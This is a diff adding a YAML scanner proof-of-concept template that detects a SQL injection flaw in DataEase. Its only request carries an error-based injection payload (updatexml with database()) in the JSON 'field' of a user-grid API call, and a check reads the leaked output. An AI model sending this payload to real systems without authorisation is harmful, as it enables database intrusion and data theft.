@@ -1,0 +1,20 @@
+id: poc-yaml-dataease-sql-injection
+info:
+  name: DataEase-SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: dataease
+requests:
+- method: POST
+  path: /api/user/userGrid/1/10
+  headers:
+    Content-Type: application/json
+  data: '{"orders":[],"conditions":[{"field":"concat(nick_name, '','' , email)) AND
+    updatexml(1,concat(0x7e,database()),1) AND (1=1","operator":"like","value":"a"}]}
+
+    '
+  expression: status_code == 500 && contains(body, "XPATH syntax error:") && contains(body,
+    "concat(nick_name, ',' , email)")
+variables: {}
+transport: http
